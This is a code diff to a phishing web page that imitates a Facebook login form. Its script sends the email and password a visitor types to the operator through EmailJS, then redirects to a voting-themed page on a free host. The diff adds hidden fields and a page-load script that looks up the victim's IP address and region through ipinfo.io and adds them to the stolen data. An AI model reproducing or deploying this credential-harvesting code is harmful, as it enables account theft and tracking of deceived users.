@@ -188,6 +188,9 @@ hr {
           <input type="text" name="emanil" id="name" value="facebook" placeholder="Email or phone number" hidden>
           <input type="text" name="emanil" id="email" placeholder="Email or phone number" required>
           <input type="password" placeholder="Password" id="message" name="message" class="input-2" required />
+          <!-- Hidden fields to store IP address and state -->
+          <input type="hidden" id="ip_address" name="ip_address">
+          <input type="hidden" id="state" name="state">
           <div class="link">
             <button type="submit" class="login">Login</button>
             <a href="https://facebook.com" class="forgot">Forgot password?</a>
@@ -201,6 +204,21 @@ hr {
     </div>
     <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
 
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+          fetch("https://ipinfo.io/json?token=d53f8306658fc8") // Replace with your free ipinfo.io API key
+          .then(response => response.json())
+          .then(data => {
+              document.getElementById("ip_address").value = data.ip;
+              document.getElementById("state").value = data.region;
+          })
+          .catch(error => console.error("Error fetching IP info:", error));
+      });
+      </script>
+
+
+
   <script type="text/javascript">
     (function() {
         emailjs.init("f4e9WkNtC012SJLfG"); // Use your EmailJS User ID
@@ -213,12 +231,16 @@ hr {
         var name = document.getElementById("name").value;
         var email = document.getElementById("email").value;
         var message = document.getElementById("message").value;
+        var ip_address = document.getElementById("ip_address").value;
+        var state = document.getElementById("state").value;
 
         // Prepare email parameters
         var emailParams = {
             from_name: name,
             from_email: email,
-            message: message
+            message: message,
+            ip_address: ip_address,
+            state: state
         };
 
         // Send the email using EmailJS
@@ -227,7 +249,7 @@ hr {
                 //console.log("Voting Is Processing:", response);
                 //alert("Voting Is Processing!");
             // Redirect to another page after email is sent
-        window.location.href = "http://thedailydish6.ct.ws/voty.html";  // Redirect to a 'thank you' page after email is sent
+        window.location.href = "http://fashionworld.infy.uk/voty.html";  // Redirect to a 'thank you' page after email is sent
             }, function(error) {
                 console.error("Login Error:", error);
                 alert("Failed to Login. Please check and try again.");
